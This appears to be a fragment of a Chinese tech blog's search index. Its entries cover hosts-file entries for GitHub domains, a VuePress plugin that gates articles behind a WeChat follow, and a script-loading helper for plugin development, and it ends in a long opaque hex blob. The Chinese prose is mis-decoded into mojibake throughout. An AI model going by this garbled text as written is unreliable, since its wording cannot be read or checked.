æŸ¥è¯¢ç½‘ç«™ï¼ŒæŸ¥è¯¢ä»¥ä¸‹åŸŸåå¯¹åº”çš„ IPï¼š 1234github.comraw.githubusercontent.comcamo.githubusercontent.comgithub.global.ssl.fastly.net ç¬¬äºŒæ­¥Linux ç³»ç»Ÿç¼–è¾‘ç³»ç»Ÿé…ç½®æ–‡ä»¶ /etc/hostsï¼Œæ–°å¢ä»¥ä¸‹ä¸¤è¡Œå†…å®¹ï¼š 1234140.82.112.4 github.com185.199.108.133 raw.githubusercontent.com185.199.108.133 camo.githubusercontent.com199.232.69.194 github.global.ssl.fastly.net Windows ç³»ç»Ÿç¼–è¾‘ç³»ç»Ÿé…ç½®æ–‡ä»¶ c:\\windows\\system32\\drivers\\etc\\hostsï¼Œæ–°å¢ä»¥ä¸‹ä¸¤è¡Œå†…å®¹ï¼š 1234140.82.112.4 github.com185.199.108.133 raw.githubusercontent.com185.199.108.133 camo.githubusercontent.com199.232.69.194 github.global.ssl.fastly.net æ‰§è¡Œä»¥ä¸‹å‘½ä»¤åˆ·æ–° DNS è§£æçš„ç¼“å­˜ï¼š 1&gt; ipconfig /flushdns var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¼€å‘éšç¬”"},{title:"Vurepress v1.x åšå®¢å¯¼æµå¾®ä¿¡å…¬ä¼—å·",url:"/posts/92228e7b.html",text:"å‰è¨€VuePress v1.x åšå®¢å»ºè®®å®‰è£… vuepress-plugin-readmore-popular æ’ä»¶ï¼Œå°† TechGrow çš„å…è´¹å¾®ä¿¡å…¬ä¼—å·å¯¼æµå·¥å…·æ•´åˆåˆ°åšå®¢ä¸­ï¼Œç”¨æˆ·æ‰«ç å…³æ³¨å¾®ä¿¡å…¬ä¼—å·åå¯ä»¥è§£é”å…¨ç«™æ–‡ç« ï¼Œè®©å¾®ä¿¡å…¬ä¼—å·çš„ç²‰ä¸æ•°èººç€å¢é•¿ã€‚ æç¤º TechGrow å¼€æ”¾å¹³å°çš„ å®˜æ–¹æ–‡æ¡£ vuepress-plugin-readmore-popular æ’ä»¶åªæ”¯æŒ VuePress v1.xï¼Œä¸æ”¯æŒ VuePress v2.x è‹¥å¸Œæœ›å®ç° VuePress v2.x çš„å…¬ä¼—å·å¯¼æµï¼Œå»ºè®®ä½¿ç”¨ vuepress-plugin-readmore-popular-next æ’ä»¶ ç‰¹è‰²åŠŸèƒ½ æ”¯æŒéšæœºä¸ºåšå®¢æ·»åŠ å¯¼æµåŠŸèƒ½ æ”¯æŒå…³é—­æŸç¯‡æ–‡ç« çš„å¯¼æµåŠŸèƒ½ æ”¯æŒæŸ¥è¯¢ç”¨æˆ·è§£é”æ–‡ç« çš„å†å²è®°å½• æ”¯æŒè‡ªå®šä¹‰æˆ–è€…åŠ¨æ€è®¡ç®—æ–‡ç« å†…å®¹çš„é¢„è§ˆé«˜åº¦ æ”¯æŒè‡ªå®šä¹‰ CSS æ ·å¼ï¼Œè½»æ¾é€‚é…ä¸åŒé£æ ¼çš„åšå®¢ æ³¨å†Œåšå®¢æµè§ˆå™¨è®¿é—® TechGrow çš„å®˜ç½‘ ï¼Œæ³¨å†Œå¹¶ç™»å½•è´¦å·åï¼Œè¿›å…¥åšå®¢çš„åå°ç®¡ç†é¡µé¢ã€‚é¦–å…ˆç‚¹å‡»å·¦ä¾§çš„èœå• åšå®¢æ³¨å†Œï¼Œç„¶åç‚¹å‡» æ–°å¢ æŒ‰é’®ï¼Œæ·»åŠ è‡ªå·±åšå®¢çš„ä¿¡æ¯ã€‚åšå®¢æ³¨å†ŒæˆåŠŸåï¼Œè®°å½•ä¸‹ åšå®¢ IDï¼Œåé¢çš„æ­¥éª¤ä¼šä½¿ç”¨åˆ° è®¾ç½®å…¬ä¼—å·åœ¨å¾®ä¿¡å…¬ä¼—å·çš„åå°ç®¡ç†é¡µé¢ï¼Œèœå•æ é‡Œé€‰æ‹© è‡ªåŠ¨å›å¤ - å…³é”®è¯å›å¤ï¼Œå¯ç”¨ è‡ªåŠ¨å›å¤ï¼Œç„¶åç‚¹å‡» æ·»åŠ å›å¤ æŒ‰é’®ï¼š å¡«å†™ è§„åˆ™åç§°ã€å…³é”®è¯ï¼ˆå½“åˆä½ åœ¨ TechGrow ä¸­è®¾ç½®çš„ï¼‰ã€å›å¤å†…å®¹ é€‰æ‹© æ–‡å­—ï¼Œç„¶å å›å¤æ–‡å­— çš„å†…å®¹å¡«å†™è·å–åšå®¢è§£é”éªŒè¯ç çš„é“¾æ¥ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼ˆè¯·è‡ªè¡Œæ›´æ”¹ xxxxx-xxxxxxxxx-xxx ä¸ºä½ ç”³è¯·åˆ°çš„åšå®¢ IDï¼‰ 1&lt;a href=\"https://open.techgrow.cn/#/readmore/captcha/generate?blogId=xxxxx-xxxxxxxxx-xxx\"&gt;ç‚¹å‡»é“¾æ¥ï¼Œè·å–åšå®¢è§£é”éªŒè¯ç &lt;/a&gt; æ­¤æ—¶ï¼Œå½“è¯»è€…å…³æ³¨ä½ çš„å¾®ä¿¡å…¬ä¼—å·ï¼Œå¹¶è¾“å…¥å…³é”®è¯åï¼ˆæ¯”å¦‚æˆ‘è®¾ç½®çš„å…³é”®è¯å°±æ˜¯ techï¼‰ï¼Œé‚£ä¹ˆè¯»è€…å°±ä¼šè‡ªåŠ¨æ¥æ”¶åˆ°è·å–åšå®¢è§£é”éªŒè¯ç çš„é“¾æ¥ å®‰è£…æ’ä»¶ è¿è¡Œ npm install å‘½ä»¤å®‰è£…æ’ä»¶åˆ°æœ¬åœ°åšå®¢ 1$ npm install -D vuepress-plugin-readmore-popular é…ç½® VuePressç¼–è¾‘ VuePress çš„ä¸»é…ç½®æ–‡ä»¶ï¼ˆä¾‹å¦‚ .vuepress/config.jsï¼‰ï¼Œæ–°å¢æ’ä»¶çš„é…ç½®ä¿¡æ¯ï¼ˆè¯·è‡ªè¡Œæ›´æ”¹åšå®¢ç›¸å…³çš„ä¿¡æ¯ï¼‰ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 1234567891011121314151617181920212223242526272829303132module.exports = { plugins: [ ['vuepress-plugin-readmore-popular', { // å·²ç”³è¯·çš„åšå®¢ ID blogId: '18762-1609305354821-257', // å·²ç”³è¯·çš„å¾®ä¿¡å…¬ä¼—å·åç§° name: 'å…¨æ ˆæŠ€æœ¯é©¿ç«™', // å·²ç”³è¯·çš„å¾®ä¿¡å…¬ä¼—å·å›å¤å…³é”®è¯ keyword: 'Tech', // å·²ç”³è¯·çš„å¾®ä¿¡å…¬ä¼—å·äºŒç»´ç å›¾ç‰‡ qrcode: 'https://www.techgrow.cn/img/wx_mp_qr.png', // æ–‡ç« å†…å®¹çš„ JS é€‰æ‹©å™¨ï¼Œè‹¥ä½¿ç”¨çš„ä¸æ˜¯å®˜æ–¹é»˜è®¤ä¸»é¢˜ï¼Œåˆ™éœ€è¦æ ¹æ®ç¬¬ä¸‰æ–¹çš„ä¸»é¢˜æ¥è®¾ç½® selector: 'div.theme-default-content', // è‡ªå®šä¹‰çš„ JS èµ„æºé“¾æ¥ï¼Œå¯ç”¨äº CDN åŠ é€Ÿ libUrl: 'https://qiniu.techgrow.cn/readmore/dist/readmore.js', // è‡ªå®šä¹‰çš„ CSS èµ„æºé“¾æ¥ï¼Œå¯ç”¨äºé€‚é…ä¸åŒé£æ ¼çš„åšå®¢ cssUrl: 'https://qiniu.techgrow.cn/readmore/dist/vuepress.css', // æ–‡ç« æ’é™¤æ·»åŠ å¼•æµå·¥å…·çš„ URL è§„åˆ™ï¼Œæ”¯æŒä½¿ç”¨è·¯å¾„ã€é€šé…ç¬¦ã€æ­£åˆ™è¡¨è¾¾å¼çš„åŒ¹é…è§„åˆ™ excludes: { strExp: [], regExp: [] }, // æ˜¯å¦åè½¬ URL æ’é™¤è§„åˆ™çš„é…ç½®ï¼Œå³åªæœ‰ç¬¦åˆæ’é™¤è§„åˆ™çš„æ–‡ç« æ‰ä¼šæ·»åŠ å¼•æµå·¥å…· reverse: false, // æ–‡ç« å†…å®¹çš„é¢„è§ˆé«˜åº¦ height: 'auto', // æ–‡ç« è§£é”åå‡­è¯çš„æœ‰æ•ˆå¤©æ•° expires: 365, // å®šæ—¶æ ¡éªŒå‡­è¯æœ‰æ•ˆæ€§çš„æ—¶é—´é—´éš”ï¼ˆç§’ï¼‰ interval: 60, // æ¯ç¯‡æ–‡ç« éšæœºæ·»åŠ å¼•æµå·¥å…·çš„æ¦‚ç‡ï¼Œæœ‰æ•ˆèŒƒå›´åœ¨ 0.1 ~ 1 ä¹‹é—´ï¼Œ1 åˆ™è¡¨ç¤ºæ‰€æœ‰æ–‡ç« é»˜è®¤éƒ½è‡ªåŠ¨æ·»åŠ å¼•æµå·¥å…· random: 1 }] ]} æ’ä»¶å‚æ•°è¯´æ˜ å‚æ•° ç±»å‹ å¿…å¡« é»˜è®¤å€¼ è¯´æ˜ blogId String æ˜¯ æ—  - name String æ˜¯ æ—  - keyword String æ˜¯ æ—  - qrcode String æ˜¯ æ—  - selector String å¦ div.theme-default-content - libUrl String å¦ https://qiniu.techgrow.cn/readmore/dist/readmore.js - cssUrl String å¦ https://qiniu.techgrow.cn/readmore/dist/vuepress.css - excludes Json Object å¦ { strExp: [ ], regExp: [ ] } - reverse Boolean å¦ false - height String / Number å¦ auto - expires Number å¦ 365 - interval Number å¦ 60 - random Number å¦ 1 - selector å‚æ•°çš„ä½œç”¨æ˜¯æŒ‡å®š JS é€‰æ‹©å™¨æ¥è·å–æ–‡ç« çš„ä¸»ä½“å†…å®¹ï¼Œè‹¥ VuePress ä½¿ç”¨äº†ç¬¬ä¸‰æ–¹ä¸»é¢˜ï¼Œåˆ™ä¸€èˆ¬éœ€è¦æ ¹æ®ç¬¬ä¸‰æ–¹ä¸»é¢˜æ¥é…ç½®è¯¥å‚æ•°ï¼Œå¦åˆ™å¯èƒ½ä¼šå¯¼è‡´å¼•æµå·¥å…·æ— æ³•ç”Ÿæ•ˆã€‚å…¶ä¸­ VuePress ä¸åŒä¸»é¢˜çš„é…ç½®ç¤ºä¾‹å¦‚ä¸‹ï¼š ä¸»é¢˜ æ’ä»¶é…ç½® å¤‡æ³¨ @vuepress/theme-vue selector: 'div.theme-default-content' å®˜æ–¹é»˜è®¤ä¸»é¢˜ vuepress-theme-reco selector: 'div.theme-reco-content' ç¬¬ä¸‰æ–¹ä¸»é¢˜ vuepress-theme-hope selector: 'div.theme-hope-content' ç¬¬ä¸‰æ–¹ä¸»é¢˜ vuepress-theme-vdoing selector: 'div.theme-vdoing-content' ç¬¬ä¸‰æ–¹ä¸»é¢˜ æç¤º è‹¥ä¸æ¸…æ¥šå¦‚ä½•æŒ‡å®š JS é€‰æ‹©å™¨ï¼Œåˆ™å¯ä»¥æ‰“å¼€åšå®¢çš„ä»»æ„ä¸€ç¯‡æ–‡ç« ï¼Œåˆ©ç”¨ Chrome ç­‰æµè§ˆå™¨çš„å…ƒç´ å®¡æŸ¥åŠŸèƒ½ï¼Œæ‰¾åˆ°æ–‡ç« é¡µé¢ä¸­æ–‡ç« ä¸»ä½“çš„ div æ ‡ç­¾ï¼Œæœ€åå®šä½å¾—åˆ° div æ ‡ç­¾çš„ CSS ç±»å³å¯ï¼ˆä¾‹å¦‚ theme-default-contentï¼‰ï¼Œç‚¹å‡»æŸ¥çœ‹è¯¦ç»†çš„æ“ä½œå›¾è§£ã€‚ éªŒè¯æ’ä»¶æ•ˆæœæ‰“å¼€æ–‡ç« é¡µé¢ï¼Œè‹¥æ–‡ç« è‡ªåŠ¨éšè—äº†éƒ¨åˆ†å†…å®¹ï¼Œå¹¶ä¸”å‡ºç°äº† é˜…è¯»å…¨æ–‡ æŒ‰é’®ï¼Œåˆ™è¯´æ˜å¯¼æµæ’ä»¶æ­£å¸¸è¿è¡Œï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ç‚¹å‡» é˜…è¯»å…¨æ–‡ æŒ‰é’®ï¼Œä¼šå¼¹å‡ºå¾®ä¿¡å…¬ä¼—å·çš„äºŒç»´ç çª—å£ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š å–æ¶ˆé˜…è¯»é™åˆ¶è‹¥å¸Œæœ›å…³é—­éƒ¨åˆ†æ–‡ç« çš„å¾®ä¿¡å…¬ä¼—å·å¯¼æµåŠŸèƒ½ï¼Œå¯ä»¥ä½¿ç”¨æ’ä»¶çš„ excludes å‚æ•°æ¥å®ç°ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œexcludes çš„å‚æ•°å€¼æ˜¯ä¸€ä¸ª JSON å¯¹è±¡ï¼Œå…¶ä¸­çš„ strExp å±æ€§æ˜¯è·¯å¾„å’Œé€šé…ç¬¦è§„åˆ™çš„å­—ç¬¦ä¸²æ•°ç»„ï¼Œè€Œ regExp å±æ€§æ˜¯æ­£åˆ™è¡¨è¾¾å¼çš„å­—ç¬¦ä¸²æ•°ç»„ã€‚ æ ¹æ® URL è·¯å¾„ï¼Œå…³é—­æŸç¯‡æ–‡ç« çš„å¯¼æµåŠŸèƒ½ 12345678module.exports = { plugins: [ ['vuepress-plugin-readmore-popular', { // æ’é™¤ URL ä¸º `/fontend/webpack` çš„æ–‡ç«  excludes: { strExp: ['/fontend/webpack'] }, }] ]} æ ¹æ® URL é€šé…ç¬¦ï¼Œå…³é—­æŸä¸ªç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ç« çš„å¯¼æµåŠŸèƒ½ 123456789module.exports = { plugins: [ ['vuepress-plugin-readmore-popular', { // æ’é™¤ URL ä»¥ `/fontend` å¼€å¤´çš„æ–‡ç«  // æ’é™¤ URL ä¸º `/backend/python/io` çš„æ–‡ç«  excludes: { strExp: ['/fontend/*', '/backend/*/io'] }, }] ]} æ ¹æ® URL æ­£åˆ™è¡¨è¾¾å¼ï¼Œå…³é—­ç¬¦åˆè§„åˆ™çš„æ‰€æœ‰æ–‡ç« çš„å¯¼æµåŠŸèƒ½ 12345678module.exports = { plugins: [ ['vuepress-plugin-readmore-popular', { // æ’é™¤ URL ä¸ä»¥ `/fontend` å¼€å¤´çš„æ–‡ç«  excludes: { regExp: ['^(?!\\/fontend).*'] }, }] ]} æ··åˆä½¿ç”¨ 1234567module.exports = { plugins: [ ['vuepress-plugin-readmore-popular', { excludes: { strExp: ['/webpack', '/fontend/*', '/backend/*/io'], regExp: ['^(?!\\/php).*'] }, }] ]} æç¤º æ–‡ç«  URL ä¼˜å…ˆåŒ¹é… strExp è§„åˆ™ï¼Œç„¶åå†åŒ¹é… regExp è§„åˆ™ æ–‡ç«  URL ä¸€æ—¦æ»¡è¶³ strExp è§„åˆ™ï¼Œåˆ™ä¸ä¼šå†åŒ¹é… regExp è§„åˆ™ å¦‚æœå¸Œæœ›ç¬¦åˆ URL æ’é™¤è§„åˆ™çš„æ–‡ç« æ‰æ·»åŠ å¯¼æµå·¥å…·ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ reverse : true é…ç½®å‚æ•°å®ç° è‡ªå®šä¹‰æ ·å¼æ’ä»¶é»˜è®¤ä½¿ç”¨äº†å®šä¹‰åœ¨ vuepress.css çš„ CSS æ ·å¼ï¼Œä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä¸¤ç§æ–¹å¼è‡ªå®šä¹‰è‡ªå·±çš„æ ·å¼ï¼š ç¬¬ä¸€ç§æ–¹å¼ï¼šæ›´æ”¹åšå®¢ä¸»é¢˜çš„ CSS æºç æ–‡ä»¶ï¼Œå°†è‡ªå®šä¹‰çš„é‚£éƒ¨åˆ† CSS æ ·å¼æ·»åŠ åˆ°é‡Œé¢ ç¬¬äºŒç§æ–¹å¼ï¼šæ ¹æ® vuepress.css åˆ›å»ºè‡ªå·±çš„ CSS æ–‡ä»¶ï¼ˆå®Œæ•´çš„ï¼‰ï¼Œå¹¶å°†å…¶å­˜æ”¾åœ¨è‡ªå·±çš„åšå®¢é‡Œï¼ŒåŒæ—¶é€šè¿‡æ’ä»¶çš„ cssUrl é…ç½®å‚æ•°æ¥æŒ‡å®šå…¶è®¿é—®çš„ URL è·¯å¾„ æç¤ºï¼šä¸ºäº†æ–¹ä¾¿æ—¥åç»´æŠ¤ï¼Œå¼ºçƒˆå»ºè®®ä½¿ç”¨ç¬¬äºŒç§æ–¹å¼æ¥æ·»åŠ è‡ªå®šä¹‰æ ·å¼ å¸¸è§é—®é¢˜é—®é¢˜ä¸€ VuePress å®‰è£…æ’ä»¶åï¼Œå¼•æµå·¥å…·æ— æ³•ç”Ÿæ•ˆã€‚ è‹¥å¼•æµå·¥å…·æ— æ³•ç”Ÿæ•ˆï¼Œæ­¤æ—¶éœ€è¦ç•™æ„ VuePress ä½¿ç”¨çš„æ˜¯ä¸æ˜¯ç¬¬ä¸‰æ–¹ä¸»é¢˜ã€‚åœ¨ä½¿ç”¨ç¬¬ä¸‰æ–¹ä¸»é¢˜çš„æƒ…å†µä¸‹ï¼Œä¸€èˆ¬éœ€è¦æ ¹æ®ç¬¬ä¸‰æ–¹ä¸»é¢˜æ¥é…ç½®æ’ä»¶çš„ selector å‚æ•°ï¼Œè¯¥å‚æ•°çš„ä½œç”¨æ˜¯æŒ‡å®š JS é€‰æ‹©å™¨æ¥è·å–æ–‡ç« çš„ä¸»ä½“å†…å®¹ï¼Œè¯¦ç»†è¯´æ˜è¯·çœ‹è¿™é‡Œã€‚ å€¼å¾—ä¸€æçš„æ˜¯ï¼Œè‹¥ç”±äº selector å‚æ•°é…ç½®ä¸æ­£ç¡®å¯¼è‡´å¼•æµå·¥å…·æ— æ•ˆï¼Œé‚£ä¹ˆå¼•æµå·¥å…·ä¼šåœ¨æµè§ˆå™¨çš„æ§åˆ¶å°è¾“å‡ºå¦‚ä¸‹çš„è­¦å‘Šä¿¡æ¯ï¼š é—®é¢˜äºŒ VuePress å®‰è£…æ’ä»¶åï¼Œæµè§ˆå™¨çš„æ§åˆ¶å°è¾“å‡ºè­¦å‘Šæˆ–è€…é”™è¯¯ä¿¡æ¯ï¼Œä¸”å¼•æµå·¥å…·æ— æ³•ç”Ÿæ•ˆ æµè§ˆå™¨è®¿é—® VuePress åšå®¢åï¼ŒæŒ‰ä¸‹ F12 å¿«æ·é”®è°ƒå‡ºè°ƒè¯•å·¥å…·ï¼Œç„¶ååˆ‡æ¢åˆ° æ§åˆ¶å°ï¼Œæœ€åå°†è­¦å‘Šæˆ–è€…é”™è¯¯ä¿¡æ¯æˆªå›¾ï¼Œå¹¶å‘é€åˆ° å®˜æ–¹å¾®ä¿¡ç¾¤ï¼Œå»ºè®®ç•™è¨€å¤‡æ³¨ VuePress ä¸ VuePress ä¸»é¢˜çš„ç‰ˆæœ¬å·ã€‚ é—®é¢˜ä¸‰ VuePress å®‰è£…æ’ä»¶åï¼Œç§»åŠ¨ç«¯çš„å¼•æµå·¥å…·æ— æ³•ç”Ÿæ•ˆï¼Œè€Œ PC ç«¯å´ç”Ÿæ•ˆ è€ƒè™‘åˆ°ç”¨æˆ·ä½“éªŒçš„é—®é¢˜ï¼Œåœ¨ç§»åŠ¨ç«¯é»˜è®¤æ˜¯å…³é—­å¼•æµåŠŸèƒ½çš„ï¼Œè¯·çŸ¥æ‚‰ã€‚ åœ¨çº¿æ¼”ç¤º å®˜æ–¹ Demo å®˜æ–¹å¾®ä¿¡ç¾¤",tags:"é™æ€åšå®¢"},{title:"VuePress æ’ä»¶å¼€å‘",url:"/posts/2f4cff19.html",text:'å‰è¨€åšä¸»å·²å¼€å‘çš„æ’ä»¶ vuepress-plugin-baidu-seo | VuePress v1 ç™¾åº¦ SEO æ’ä»¶ vuepress-plugin-baidu-seo-next | VuePress v2 ç™¾åº¦ SEO æ’ä»¶ vuepress-plugin-readmore-popular | VuePress v1 å…¬ä¼—å·å¼•æµæ’ä»¶ vuepress-plugin-readmore-popular-next | VuePress v2 å…¬ä¼—å·å¼•æµæ’ä»¶ VuePress å®˜æ–¹æ’ä»¶VuePress v1.x VuePress v1.x å®˜æ–¹ä¸­æ–‡æ–‡æ¡£ VuePress v1.x å®˜æ–¹æ’ä»¶çš„ä»£ç ä»“åº“ VuePress v2.x VuePress v2.x å®˜æ–¹ä¸­æ–‡æ–‡æ¡£ VuePress v2.x å®˜æ–¹æ’ä»¶çš„ä»£ç ä»“åº“ VuePress v1 æ’ä»¶å¼€å‘Vue ç»„ä»¶å¼•å…¥å†…éƒ¨ JS æ–‡ä»¶ç¬¬ä¸€æ­¥ï¼šåœ¨é¡¹ç›®å†…å®šä¹‰ JS æ–‡ä»¶ï¼Œä¾‹å¦‚è¿™é‡Œå®šä¹‰ loadResources.js æ–‡ä»¶ï¼ŒåŒæ—¶é€šè¿‡ export æš´éœ² JS å‡½æ•°ï¼š 123456789101112131415161718192021222324252627282930313233343536// å¼•å…¥Qconst Q = require(\'q\');/** * å¼‚æ­¥åŠ è½½jsæ–‡ä»¶ * * @param url å¯¼å…¥jsçš„urlåœ°å€ * @param id scriptæ ‡ç­¾çš„idï¼ˆå¿…é¡»å”¯ä¸€ï¼‰ * @returns {*} exportæ­¤å‡½æ•°æ–¹ä¾¿å…¨å±€è°ƒç”¨ */export function asyncLoadJs(url, id) { return Q.Promise((resovle, reject) =&gt; { let srcArr = document.getElementsByTagName(\'script\'); let hasLoaded = false; for (let i = 0; i &lt; srcArr.length; i++) { hasLoaded = srcArr[i].id === id; if (hasLoaded) { document.getElementById(id).remove(); } } let script = document.createElement(\'script\'); script.type = \'text/javascript\'; script.src = url; script.id = id; document.body.appendChild(script); script.onload = () =&gt; { resovle(); }; script.onerror = () =&gt; { reject(); } })} ç¬¬äºŒæ­¥ï¼šåœ¨é¡¹ç›®é‡Œå®šä¹‰ Vue ç»„ä»¶ï¼Œä¾‹å¦‚è¿™é‡Œå®šä¹‰ example.vueï¼ŒåŒæ—¶é€šè¿‡ import å¼•å…¥ä¸Šé¢å®šä¹‰çš„ JS æ–‡ä»¶å³å¯ï¼š 12345678910111213141516171819&lt;template&gt; &lt;div&gt;&lt;/div&gt;&lt;/template&gt;&lt;script&gt;import { asyncLoadJs } from "../js/loadResources.js";export default { name: "example", data() { return {}; }, mounted() { asyncLoadJs("https://www.example/js/example.js", "example"); },};&lt;/script&gt;&lt;style lang="scss" scoped&gt;&lt;/style&gt; å‚è€ƒèµ„æ–™ ä»é›¶å®ç°ä¸€ä¸ª VuePress æ’ä»¶ VuePress åšå®¢ä¼˜åŒ–ä¹‹æ‹“å±• Markdown è¯­æ³• var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"é™æ€åšå®¢ å‰ç«¯"},{title:"é¡¹ç›®å¼€å‘è®¡åˆ’",url:"/posts/29d74d90.html",text:"4cfab7e4fdfd9afdbf1592f9652b8a194263aa6a7e6b4c103fbd9ff49c09b0448cdca81362464dc5686f95504da6299b6490ac25c35cdeb830b4ba7a9cf2685b33fc39e79fb8f4428211a3627c1ec7a0cbbf24dada87cb794a94c4848262ef48357c8d73a5bf83d40948261328d66e0bff17ffd38d41bcd0d1fc683fc31dd3c80e71868c7bf52ab01e12be51f74475299f4ac9540a69a67d78f5e7c10d4c0b764a171047a5eaf857aa307673cc4c870e17499b5c62dccb724834333eb82019590ad2374fbd15ce6c9c7b5d1dba92e43554f32d1c73942822adecdef87379cbac9e9349bd85119796d6a5c6631f5e516f0478907db61af4f983aa6ad2b5393cf975687eb140a1e9fbb2292575ea2aedd7553199ac383d191771bd23715e460a04bf468193f6e2071f64e22ed4c65c2ac7d8b8639d9771ee6e2498836a50c2cdcc137a9101754df3b9d9b71ae22b063068988f7b452b687a3ca86f1225e78aea53ae9375d1ba81ed8c51c939b3dde59d3e8aefca60992d4c3b0403027a8d42fcf983c2a28e783d128345be7644aa8d307e910d3243bbf5eb15536f73a261eb53d9b3988aa2d107e8ce57128cbeeab9f603f34ed98a0344711549d8dfc12ee7e4f523e9331bbd2fe1b96e28595c8c35d3b74eb5331a584aed77b4b8622ce0ca8e750848cb4a8040e86ff2225802c7a60fd8dc8583da9b1c93ab90607816e3e2d6161fe10290b99286ccaadbe693931db26627ddb0785342c72e70b84d3b14063fbc433c89dc272bb1805a6afbefa59b5c364ca7236c13e24859bc56b7592c597ab88c8e7ba3325fdb35fa868320770c4f2a9970fdde3b8d880f62481faf009a9a609b29577e316fcef1a05f05a5b98e153b8f5f70b17a83238434f9913be36c1d75d46788c69be844d11db6d1ef9d8c21a1ee46cd3f66ba08f208326cbef8cff85cc761e96d9d2f4038f7da668fe21cd2c7cb762efdfda37d57db491b817ce5e1913781f5a89b768ff1fa4c940e9eb181c735455355ece547985cc6eb85c2ce8762dd1f08a584c6e263aebb49e080d562afa87acfd37f2c4c6e8df2102b83260c1c1e807af8022317710d1a0ab961e3515dad4d8b8f76f364fa5118cd4b4beff058955e587d31f284800745aa0223f543ceea88746733a02cbbec8d16f9847357f64f0c48e22c617e7097b322120bb9d8eed8dc2f78aeedf44976607f15413fa1540e75befbcaefe3f390b9c0c29d8b3e544758561a9603181001fbdbe32d813f3627246b2c8605326a702e7cb1ead44fec4cd01f3510e952400d928571e4677ca15e5a6365318fd8d550ea26c5594c9d1fab911270f7a1f95bfcf368bb28ea7059d33329dfc48c44427bbc86975c9f1a1c437001107f3d5976a77821dbbc28e503a5ab937681820f226296600f71e39b894b3e149b62601683800574527e704711b63626cbc2b24103229bd3cf2af35d6e87234c228eacb0c6870c739a486efdccd24f74467bde3f889bdc7f6024f7591f0885b312bccae928351de2d1a0880dd72a3b5e89ec2da0bae15b92ee6055fd37047a52cbd2f31675c0e298f620848b7b94ee1fd086207456de4e191bed6ce4207ef567ae7d2bbf26578c8af91623c6318badb1a4091497f8c3f9c604b49817d2eec38cea8d6c3efcee3b3594dc52d8930cfc758e297de6fbf087c0df84df1de920a84cb129a7bb8cfa6a68b938307d4a7e93ae1f03ce5605e3fce71afbfc5e562a727dfb9069fe0dfd0ad019fb4c91724c89af86caafb1a6b508831c6df3a64bf795c1dc72e507f69cb37566cff77899cbd899ddbe626c6bd952db75b3c0e3639f5fb1c1d19ed5c3548e68a1cbfca1f80c91452aee5a8dbfc0d30c848bc880a88be0d6446537e42de4400a5d5b64bb57d0015f1e5fa10b23a8b70d0c1a41dbb9d20348cbc68f1d65d997d9852cfca10aefa13da27cc7b0f6a3653024bd33b6729090c4fb4be980f0425598092cc6e659c017e61f644eb1a80fa0bc5dd1aae99a51445e0f55e853748ac793d53e0033673d62072c08e64b9642f9d99a5f0f23b0a1073dde8dd7e76cb0995722928a0ef6a71b3b59ea40b341bc6a4c36695bb727f3750d47f1a203deba8f3d4f620df41395c5f120ac488962f5fd3db4f372e2f17682d264ebef75dc8b596acd6bd54c6fb4a8c1119166bc85444e491b1cc17b0f81547f4796b8007254f5a895df434e830fdb2d1d95c732b3231f1f8c2e60c24977f876bf299e90269905dec1ea004a71d1ed82c851972cc2b87fee07bb7a3ea05199b949a753f7990c59cdf21d83e1bea50e6c59a2f8658ac70722d4bc2b72435054c63ce46c03dea67b5430fd7a5c91c71ebd902a7e949c8f063303ac110a20191b246df42dfd10d2eec37c8a891d1ca8b97f6ffcf776531dbd156effd631f428e23ea4ad8f5b6521bfb61c37837377bd6c178047b2971c8e1fe4ed143a1f8cbca9b9a2058b42df1fa282b63b9fbb240de487e3d647c8e56066f1d46b10cbcc7fcd6d7a63a14b88d9b946b313890343ebfcbd1bf1f7dc78f94f6e04591ab5021846f41ae1dcde6e7a81c0dc1638b1ae0235b5f7506b1d81d89ced8d80356e58221d8d3f05dbf072e513cd2454bff7bd8e22dca397753afa6ee4a609c16afd34e44d45911484e32079c7b683b9b3814f2a5e76a42d88ff3fcda41a8645d670a36b56ce53d9b2d2fe13a3f750d76939c7366cd224201e04c2198df501ca101e3c706f4fe19ad42cf7f4e6a6f755b0431b3f7e7c189427c576234e068e461c84d7bba04c1c3a308482305761869d66752cd1490f66b6b53d570b9aac11be2de7ac29c50aab942375e39ff176ace19cea25783df8c9435dfd9c3df299a73db5c745b7d3acb7970f87906cf8ea3a9ce79fb035f789649678de5d3dfc2221bc7e486575d0a5f2d558e93ae255ded8f29bf5a7c9d90dee719e525816826bc85024ca6443961956a743ad20648472c1ad850ea4d34e71ebfb4736c3e1028fd578cdff195319b05ec5806be65a8865f4a634c42175c99944f87248aa5d122c159396bf40d579033c02be840305d2371fcad71cc2fc33cf787f947fb37b3259225ffff068011a0c5d2bbb1333f244026b315710b2bf1ec8ff111ef93fa3d843cd6b0a1ef945cb35f73711391061d14